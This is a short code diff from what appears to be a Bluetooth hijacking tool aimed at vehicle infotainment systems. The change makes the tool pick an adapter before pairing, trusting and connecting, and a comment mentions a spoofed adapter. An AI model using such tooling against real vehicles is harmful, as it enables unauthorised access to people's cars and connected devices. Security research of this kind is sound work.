@@ -172,8 +172,10 @@ class HijackSession:
             info(f"Connecting to IVI {self.ivi_address}...")
 
             # bluetoothctl requires commands via stdin since it's interactive.
-            # Sequence: pair -> trust -> connect (from PDF workflow)
+            # Select the correct adapter first (critical for multi-adapter setups
+            # where one adapter is spoofed), then pair -> trust -> connect.
             bt_commands = "\n".join([
+                f"select {self.hci}",
                 f"pair {self.ivi_address}",
                 f"trust {self.ivi_address}",
                 f"connect {self.ivi_address}",
